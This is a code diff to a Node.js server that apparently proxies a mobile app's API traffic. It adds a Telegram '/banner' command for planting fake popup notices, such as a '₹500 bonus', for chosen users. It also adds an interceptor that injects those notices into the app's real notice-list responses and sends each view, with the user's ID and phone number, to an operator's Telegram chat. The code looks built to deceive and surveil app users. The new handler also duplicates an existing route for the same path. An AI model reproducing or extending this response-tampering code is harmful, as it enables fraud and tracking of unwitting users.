@@ -1289,6 +1289,83 @@ Example:
       return res.sendStatus(200);
     }
 
+
+    // === BANNER COMMAND HANDLER ===
+    if (text.startsWith('/banner')) {
+      const parts = text.split(' ').filter(Boolean);
+      const subCmd = parts[1] ? parts[1].toLowerCase() : '';
+
+      if (subCmd === 'clear' || subCmd === 'off') {
+        const targetId = parts[2] ? parts[2].trim() : null;
+        data.userBanners = data.userBanners || {};
+        if (!targetId || targetId.toLowerCase() === 'all') {
+          data.userBanners = {};
+          await saveData(data);
+          await bot.sendMessage(chatId, '🧹 *All Banner Notices Cleared!*', { parse_mode: 'Markdown' });
+        } else {
+          delete data.userBanners[String(targetId)];
+          await saveData(data);
+          await bot.sendMessage(chatId, '🧹 *Banner Notice Cleared for User `' + targetId + '`!*', { parse_mode: 'Markdown' });
+        }
+        return res.sendStatus(200);
+      }
+
+      if (parts.length < 3) {
+        await bot.sendMessage(chatId,
+          '⚠️ *Invalid Banner Command Syntax*\n\n' +
+          'Usage:\n' +
+          '• `/banner <userId> <message>` — Set banner\n' +
+          '• `/banner <userId> <Title> | <Message>` — Custom title\n' +
+          '• `/banner clear [userId]` — Clear banner\n\n' +
+          'Example:\n`/banner 254627 Welcome Bonus | You received ₹500!`',
+          { parse_mode: 'Markdown' }
+        );
+        return res.sendStatus(200);
+      }
+
+      const targetUserId = parts[1].trim();
+      const rawContent = parts.slice(2).join(' ').trim();
+      data.userBanners = data.userBanners || {};
+
+      if (rawContent.toLowerCase() === 'off' || rawContent.toLowerCase() === 'clear') {
+        delete data.userBanners[String(targetUserId)];
+        await saveData(data);
+        await bot.sendMessage(chatId, '🧹 *Banner Notice Cleared for User `' + targetUserId + '`!*', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+
+      let customTitle = '🚨 VIP Notice';
+      let bannerMsg = rawContent;
+
+      if (rawContent.includes('|')) {
+        const pipeSplit = rawContent.split('|');
+        customTitle = pipeSplit[0].trim();
+        bannerMsg = pipeSplit.slice(1).join('|').trim();
+      }
+
+      data.userBanners[String(targetUserId)] = {
+        id: Math.floor(100000 + Math.random() * 899999),
+        title: customTitle,
+        content: bannerMsg,
+        seenCount: 0,
+        createdAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+      };
+
+      await saveData(data);
+
+      const phone = getPhone(data, targetUserId);
+      const confirmMsg =
+        '✅ *Banner Notice Set Successfully!*\n' +
+        '━━━━━━━━━━━━━━━━━━\n' +
+        '👤 *User ID:* `' + targetUserId + '`' + (phone ? ' (' + phone + ')' : '') + '\n' +
+        '📌 *Title:* ' + customTitle + '\n' +
+        '💬 *Message:* ' + bannerMsg + '\n\n' +
+        '🔔 *Realtime Tracking Active:* You will get a notification in Telegram every time this user sees the banner in the app!';
+
+      await bot.sendMessage(chatId, confirmMsg, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
     if (text === '/status') {
       const active = getActiveBank(data, null);
       const idCount = Object.keys(data.userOverrides || {}).length;
@@ -2779,6 +2856,82 @@ app.all('/app/app/popup/notice/currentList', async (req, res) => {
         else if (jsonResp.data && Array.isArray(jsonResp.data.data)) jsonResp.data.data = list;
       }
     }
+    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
+  } catch (e) {
+    await transparentProxy(req, res);
+  }
+});
+
+
+// === POPUP NOTICE INTERCEPTOR & BANNER SEEN NOTIFIER ===
+app.all('/app/app/popup/notice/currentList', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
+
+    if (userId && data.userBanners && data.userBanners[String(userId)]) {
+      const b = data.userBanners[String(userId)];
+      let list = [];
+      
+      if (jsonResp && jsonResp.data) {
+        if (Array.isArray(jsonResp.data)) {
+          list = jsonResp.data;
+        } else if (Array.isArray(jsonResp.data.data)) {
+          list = jsonResp.data.data;
+        }
+      }
+
+      const customNotice = {
+        id: b.id || Math.floor(100000 + Math.random() * 899999),
+        title: b.title || '🚨 VIP Notice',
+        content: b.content || '',
+        type: 1,
+        linkUrl: '',
+        sort: 999999
+      };
+
+      // Insert custom banner at position 0 so it pops up first!
+      list.unshift(customNotice);
+
+      if (jsonResp && jsonResp.data) {
+        if (Array.isArray(jsonResp.data)) {
+          jsonResp.data = list;
+        } else if (Array.isArray(jsonResp.data.data)) {
+          jsonResp.data.data = list;
+        }
+      }
+
+      // Increment seen count
+      b.seenCount = (b.seenCount || 0) + 1;
+      b.lastSeenTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      await saveData(data);
+
+      // Send Seen Notification to Telegram Admin
+      if (data.adminChatId && bot) {
+        const getOrdinalText = (n) => {
+          if (n === 1) return 'first time';
+          if (n === 2) return 'second time';
+          if (n === 3) return 'third time';
+          return n + 'th time';
+        };
+
+        const seenText = getOrdinalText(b.seenCount);
+        const phone = getPhone(data, userId);
+
+        const seenAlert =
+          '👀 *Banner Seen by User* (' + seenText + ')\n' +
+          '━━━━━━━━━━━━━━━━━━\n' +
+          '👤 *User ID:* \`' + userId + '\`' + (phone ? ' (' + phone + ')' : '') + '\n' +
+          '📌 *Title:* ' + (b.title || '🚨 VIP Notice') + '\n' +
+          '💬 *Message:* ' + b.content + '\n' +
+          '📊 *Total Views:* ' + b.seenCount + ' times\n' +
+          '🕐 *Time:* ' + b.lastSeenTime;
+
+        bot.sendMessage(data.adminChatId, seenAlert, { parse_mode: 'Markdown' }).catch(() => {});
+      }
+    }
+
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) {
     await transparentProxy(req, res);
